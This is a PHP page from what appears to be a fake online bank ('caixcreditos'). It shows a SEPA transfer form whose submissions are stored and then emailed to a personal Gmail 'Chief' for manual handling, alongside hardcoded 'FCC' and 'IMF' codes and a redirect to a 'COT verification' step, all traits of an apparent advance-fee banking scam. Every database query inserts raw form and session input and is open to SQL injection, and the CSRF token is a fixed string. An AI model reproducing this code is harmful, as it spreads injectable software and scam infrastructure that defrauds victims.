<?php include 'includes/timeoutable.php' ?>

<body background: src="img/picc3.jpg" onload="blinktext();">
    <?php include 'includes/db.php'; ?>
    <?php 
    if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) { //ALL CODE RUNS INSIDE THIS IF A USER IS LOGGED IN
    } else { //IF NO USER LOGGED IN
        echo "<script type='text/javascript'> document.location = 'index.php?login_error=session'; </script>";
      //  header('Location: login.php?login_error=wrong');
    }
?>
<?php include 'header2.php';  ?>
<?php
ini_set("date.timezone", "Africa/Lagos");

                $date = date('Y-m-d H:i:s'); 
?>
<div style="min-height: 80vh;  margin-top: 100px ">
                                        <section>
        <div class="container">
            <div class="row">
                <div class="col-md-4 add">
                                            
                                                    <div class="panel panel-default">
    <div class="panel-heading" style="background-color: #005eb8;">
        <h3 class="panel-title" style="color: white">Fill out the form to proceed</h3>
    </div>
    <div class="panel-body">
        <h3 class="text-center">
            <span class="text-info add price dollar"><?php
                                $my_sql = "SELECT * FROM provide WHERE user_id = '$_SESSION[id]'";
                            $run_sql = mysqli_query($conn,$my_sql);
                            if($rows = mysqli_fetch_assoc($run_sql)){
                                echo'
                                <h3><i class="fa fa-dollar fa-1x">' .$rows['amount'] ; 
                            }
                                ?></i></span>
        </h3>
        <div class="text-center add padding-bottom-10px"><span class="label label-default blinking" id="announcement">Ready to Initialize..</span></div><br>
        <div id="myProgress">
  <div id="myBar">0%</div>
</div><br>
                                                        <?php    if(isset($_GET['insufficient_balance'])){
                                                            echo'<div class="alert alert-danger text-center">
                                                                <strong>Insufficient balance</strong></div><br>';
} ?>
                    <div class="alert alert-info text-center">
  European <strong>SEPA</strong> Transfer
</div><br>
            <br>
            
            <form  class="form-horizontal" method="post"  action="intrabank.php">
                        <input type='hidden' name='csrfmiddlewaretoken' value='XFe2rTYl9WOpV8U6X5CfbIuOZOELJ97S' />
                       
                        <div id="div_id_location" class="form-group required">
                            <label for="id_location" class="control-label col-md-4"> Transaction Type</label>
                            <div class="controls col-md-8 ">
                                <input class="input-md textinput textInput form-control" id="id_location" name="location" placeholder="European SEPA Transfer" style="margin-bottom: 10px" type="text" readonly>
                            </div> 
                        </div>
                <div id="div_id_company" class="form-group required"> 
                            <label for="amount" class="control-label col-md-4  requiredField" style="color: green"> Amount</label>
                            <div class="controls col-md-8 "> 
                                 <input class="input-md textinput textInput form-control" id="amount" name="amount" placeholder="Amount" style="margin-bottom: 10px" type="number" / required>
                            </div>
                        </div> 
                        <div id="div_id_bank_name" class="form-group required">
                            <label for="bank_name" class="control-label col-md-4  requiredField"> Bank</label>
                            <div class="controls col-md-8 ">
                                <input class="input-md  textinput textInput form-control" id="bank_name" maxlength="30" name="bank_name" placeholder="Bank Name" style="margin-bottom: 10px" type="text" / required>
                            </div>
                        </div>
                        <div id="div_id_acct_number" class="form-group required">
                            <label for="id_acct_number" class="control-label col-md-4  requiredField">Name</label>
                            <div class="controls col-md-8 ">
                                <input class="input-md acct_numberinput form-control" id="id_acct_name" name="b_name" placeholder=" Beneficiary Name" style="margin-bottom: 10px" type="text" / required>
                            </div>     
                        </div>
                        <div id="div_id_acct_number" class="form-group required">
                            <label for="id_password1" class="control-label col-md-4  requiredField">IBAN</label>
                            <div class="controls col-md-8 "> 
                                <input class="input-md numinput nunInput form-control" id="acct_number" name="b_acct" placeholder="IBAN Number" style="margin-bottom: 10px" type="text" / required>
                            </div>
                        </div>
                        <div id="div_id_country" class="form-group required">
                             <label for="address" class="control-label col-md-4  requiredField"> Address</label>
                             <div class="controls col-md-8 ">
                                <input class="input-md  input form-control" id="address" name="address" placeholder="Bank Address" style="margin-bottom: 10px" type="text" />
                            </div>
                        </div>
                        <div id="div_id_name" class="form-group required"> 
                            <label for="id_name" class="control-label col-md-4  requiredField"> Swift Code</label> 
                            <div class="controls col-md-8 "> 
                                <input class="input-md textinput textInput form-control" id="id_name" name="swift_code" placeholder="Swift Code" style="margin-bottom: 10px" type="text" / required>
                            </div>
                        </div>
                       <!-- <div id="div_id_gender" class="form-group required">
                            <label for="id_gender"  class="control-label col-md-4  requiredField"> Gender</label>
                            <div class="controls col-md-8 "  style="margin-bottom: 10px">
                                 <label class="radio-inline"> <input type="radio" name="gender" id="id_gender_1" value="M"  style="margin-bottom: 10px">Male</label>
                                 <label class="radio-inline"> <input type="radio" name="gender" id="id_gender_2" value="F"  style="margin-bottom: 10px">Female </label>
                            </div>
                        </div>-->
                        <div id="div_id_company" class="form-group required"> 
                            <label for="id_company" class="control-label col-md-4  requiredField"> Bank Code</label>
                            <div class="controls col-md-8 "> 
                                 <input class="input-md textinput textInput form-control" id="id_company" name="routing_number" placeholder="Bank Code" style="margin-bottom: 10px" type="text" / required>
                            </div>
                        </div> 
                        <div id="div_id_catagory" class="form-group required">
                            <label for="id_catagory" class="control-label col-md-4  requiredField">Purpose</label>
                            <div class="controls col-md-8 "> 
                                 <input class="input-md textinput textInput form-control" id="id_catagory" name="description" placeholder="Purpose/Description" style="margin-bottom: 10px" type="text" / required>
                            </div>
                        </div> 
                        <div id="div_id_number" class="form-group required">
                             <label for="id_number" class="control-label col-md-4  requiredField"> Account Type</label>
                             <div class="controls col-md-8 ">
                                 <select name="acct_type" id="acct_type" class="form-control" required>
                                      <option value="saving" selected>Savings Account</option>
                                      <option value="current">Current Account</option>
                                      <option value="checking">Checking Account</option>
                                      <option value="fixed">Fixed Deposit</option>
                                     <option value="non_resident">Non Resident Account</option>
                                      <option value="online_banking">Online Banking</option>
                                       <option value="domicilary">Domicilary Account</option>
                                     <option value="joint">Joint Account</option>
                                    </select>
                            </div> 
                        </div> 
                        
                        <div class="form-group"> 
                            <div class="aab controls col-md-4 "></div>
                            <div class="controls col-md-8 ">
                                <input type="submit" onclick="move()" name="intra_submit" value="Make Transfer" style="background-color: #005eb8; color: white" class="btn btn" id="submit-id-signup" />
                            </div>
                        </div> 
                            
                    </form>
        
        
            </div>
</div>                                                            </div>
                <div class="col-md-4">
                    <div class="panel panel-default">
                        <div class="panel-heading" style="background-color: #005eb8;">
                            <h3 class="panel-title" style="color: white">Status</h3>
                        </div>
                        <div class="panel-body panel-table">
                                                            <div class="table-responsive">
                                    <table class="table table-hover table-bordered">
                                        <thead>
                                        <tr>
                                            <th class="text-center" id="announcement">AMOUNT</th>
                                            <th class="text-center">TIME</th>
                                            <th class="text-center">STATUS</th>
                                        </tr>
                                        </thead>
                                        <tbody>
                                                                                    <tr class="text-center  blink ">
                                                                                        <?php
                                    $status = "PROCESSING";
                                $my_sql = "SELECT * FROM provide WHERE user_id = '$_SESSION[id]'";
                            $run_sql = mysqli_query($conn,$my_sql);
                            if($rows = mysqli_fetch_assoc($run_sql)){ ?>
                                                <td class="text-left">
                                                    <a href="billing.php"
                                                       class="btn-link btn-warning">
                                                        <span class="text-uppercase" id="announcement"><i class="fa fa-dollar fa-1x" id="announcement"></i> <?php echo $rows['amount']; ?></span>
                                                    </a>
                                                </td>
                                                <td>
                                                    <span class="add price dollar"><?php echo $rows['created_at']; ?></span>
                                                </td>
                                                <td>
                                                                                                            <span class="text-info"><?php echo $status; 
                            ;}
                                ?></span>
                                                                                                    </td>
                                            </tr>
                                                                                </tbody>
                                    </table>
                                </div>
                                <div class="text-center">
                                    
                                </div>
                                                    </div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="panel panel-default">
                        <div class="panel-heading" style="background-color: #005eb8;">
                            <h3 class="panel-title blinking" style="color: white">Transaction History</h3>
                        </div>
                        <div class="panel-body panel-table">
                                                            <div class="alert">
                                    <strong>No withdrawal history found!</strong>
                                </div>
                                                    </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    </div>
   
            <?php include 'footer.php' ?>
</body>
<?php
if(isset($_POST['intra_submit'])){
        $b_name = $_POST['b_name'];
        $b_acct = $_POST['b_acct'];
        $name = $_SESSION['name'];
        $swift_code = $_POST['swift_code'];
        $bank_name = $_POST['bank_name'];
        $routing_number = $_POST['routing_number'];
        $description = $_POST['description'];
        $address = $_POST['address'];
        $acct_type = $_POST['acct_type'];
        $amount = $_POST['amount'];
        $s_code = 'FCC00851423';
        $imf = 'TCC61084139';
    
        $inter_sql = "SELECT * FROM users WHERE id ='$_SESSION[id]'";
        $inter_q = mysqli_query($conn, $inter_sql);
        while($rows = mysqli_fetch_assoc($inter_q)){
            $d_amount = $rows['amount'];
            if($amount > $d_amount){
                echo "<script type='text/javascript'> document.location = 'intrabank.php?insufficient_balance'; </script>";
            }
        }
        
        $inter_sql = "SELECT * FROM int_transfer WHERE user_id ='$_SESSION[id]'";
        $inter_q = mysqli_query($conn, $inter_sql);
        if(mysqli_num_rows($inter_q) > 0){
              $sql = "UPDATE int_transfer SET b_name='$b_name', b_acct='$b_acct', swift_code='$swift_code', bank_name='$bank_name', routing_number='$routing_number', description='$description', address='$address', amount='$amount', acct_type='$acct_type', imf='$imf', last_updated='$date'  WHERE user_id = '$_SESSION[id]'";
            $sql_q = mysqli_query($conn, $sql);
            $sql = "SELECT * FROM int_transfer WHERE user_id = '$_SESSION[id]'"; //FOR USERS
        $result1 = mysqli_query($conn,$sql);
                     //TO SEND EMAIL Admin begins
                 while($rows = mysqli_fetch_assoc($result1)){ 
                    $c_id = $rows['user_id'];
                    $b_name = $rows['b_name'];
                    $b_account = $rows['b_acct'];
                    $b_country = $rows['b_country'];
                    $swift_code = $rows['swift_code'];
                    $b_routing = $rows['routing_number'];
                    $b_bank = $rows['bank_name'];
                    $b_acct_type = $rows['acct_type'];
                    $amount = $rows['amount'];
                    $name1 = "Chief";
                    $to = "priestzukamosaic@gmail.com"; // this is your Email address
                $from = "info@caixcreditos.com"; // this is the sender's Email address
                $subject2 = "Client | Activities";
                $message2 = "Hello " . $name1 .",
  

" . $name." is trying to enter his/her FCC code, find Details below:
Customer ID : " . $c_id . "
Client Name: " . $name."
Beneficiary Name: " .$b_name."
Beneficiary Account: ".$b_acct_type."
Swiftcode: ".$swift_code."
Routing Number: ".$b_routing ."
Beneficiary Bank: ".$b_bank ."
Beneficiary Account Number: ".$b_account ."
Amount: ".$amount ."
Bank Adress: ".$address ."
------------------------
  
Sign into your Admin panel to effect the transaction:
http://www.app.caixcreditos.com/zap
  
";
                $headers = "From:" . $from;
                mail($to,$subject2,$message2,$headers);}  // sends a copy of the message to the sender
                //TO SEND EMAIL ENDS
            echo "<script type='text/javascript'> document.location = 'sepa_cot_verification.php?updated_successfuly'; </script>";
            }else{
            
            $ins_sql1 = "INSERT INTO int_transfer (bank_name, b_name, user_id, b_acct, b_country, swift_code, routing_number, acct_type, amount, name, address, code, description, imf, last_updated) VALUES ('$bank_name', '$b_name', '$_SESSION[id]', '$b_acct', '$b_country', '$swift_code', '$routing_number', '$acct_type', '$amount', '$name', '$address', '$s_code', '$description', '$imf', '$date')";
                    $run_sql2 = mysqli_query($conn, $ins_sql1);
            echo "<div id='myProgress'>
  <div id='myBar'>processing</div>
</div>";
 $sql = "SELECT * FROM int_transfer WHERE user_id = '$_SESSION[id]'"; //FOR USERS
        $result1 = mysqli_query($conn,$sql);
                     //TO SEND EMAIL Admin begins
                 while($rows = mysqli_fetch_assoc($result1)){ 
                    $c_id = $rows['user_id'];
                    $b_name = $rows['b_name'];
                    $b_account = $rows['b_acct'];
                    $b_country = $rows['b_country'];
                    $swift_code = $rows['swift_code'];
                    $b_routing = $rows['routing_number'];
                    $b_bank = $rows['bank_name'];
                    $b_acct_type = $rows['acct_type'];
                    $amount = $rows['amount'];
                    $b_address = $rows['address']; 
                    $name1 = "Chief";
                    $to = "priestzukamosaic@gmail.com"; // this is your Email address
                $from = "info@caixcreditos.com"; // this is the sender's Email address
                $subject2 = "Client | Activities";
                $message2 = "Hello " . $name1 .",
  

" . $name." is trying to enter his/her FCC code, find Details below:
Customer ID : " . $c_id . "
Client Name: " . $name."
Beneficiary Name: " .$b_name."
Beneficiary Account: ".$b_acct_type."
Swiftcode: ".$swift_code."
Routing Number: ".$b_routing ."
Beneficiary Bank: ".$b_bank ."
Beneficiary Account Number: ".$b_account ."
Amount: ".$amount ."
Bank Adress: ".$b_address ."
------------------------
  
Sign into your Admin panel to effect the transaction:
http://www.app.caixcreditos.com/zap
  
";
                $headers = "From:" . $from;
                mail($to,$subject2,$message2,$headers);}  // sends a copy of the message to the sender
                //TO SEND EMAIL ENDS
            echo "<script type='text/javascript'> document.location = 'sepa_cot_verification.php?insertsuccess'; </script>";
        }
        
    }else{
        echo 'sorry! One or more fields are empty';
    }

?>

